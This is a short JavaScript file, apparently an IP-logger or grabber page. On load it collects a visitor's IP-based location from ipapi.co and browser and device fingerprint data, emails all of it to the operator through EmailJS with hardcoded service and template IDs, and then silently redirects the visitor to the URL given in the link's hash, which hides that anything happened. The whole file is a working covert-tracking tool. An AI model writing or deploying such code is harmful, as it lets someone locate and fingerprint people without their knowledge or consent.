const PUBLIC_KEY = 'FgUZVGz0G0JugxWmE'
const YOUR_SERVICE_ID = 'service_xt8j716'
const YOUR_TEMPLATE_ID = 'template_kocbwo8'

emailjs.init({
  publicKey: PUBLIC_KEY,
})

async function fetchData(requestInfo) {
  try {
    const response = await fetch(requestInfo)
    const jsonData = await response.json()

    return jsonData
  } catch (error) {
    return error
  }
}

async function acquireUserData() {
  const data = {}

  data.ipApi = await fetchData('https://ipapi.co/json/')
  data.hardwareConcurrency = navigator.hardwareConcurrency
  // data.geolocation = navigator.geolocation | asks for permission
  data.storage = navigator.storage
  data.deviceMemory = navigator.deviceMemory
  data.gpu = navigator.gpu
  data.connection = navigator.connection
  data.userAgent = navigator.userAgent // Browser user agent string
  data.platform = navigator.platform // Operating system platform
  data.languages = navigator.languages || navigator.language // User's preferred language
  data.appCodeName = navigator.appCodeName // Browser name (might be generic)
  data.appName = navigator.appName // Browser application name (might be generic)
  data.isMobile = navigator.maxTouchPoints > 0
  data.screen = window.screen

  return data
}

async function sendData(data) {
  return emailjs
    .send(YOUR_SERVICE_ID, YOUR_TEMPLATE_ID, { body: JSON.stringify(data) })
    .then(
      (response) => {
        console.log('SUCCESS!', response.status, response.text)
      },
      (error) => {
        console.log('FAILED...', error)
      },
    )
}

async function getAndSendData() {
  const data = await acquireUserData()
  await sendData(data)

  // Redirect user after we're done
  const hash = window.location.hash.slice(1)

  if (!hash) return

  window.location.replace(hash)
}

getAndSendData()
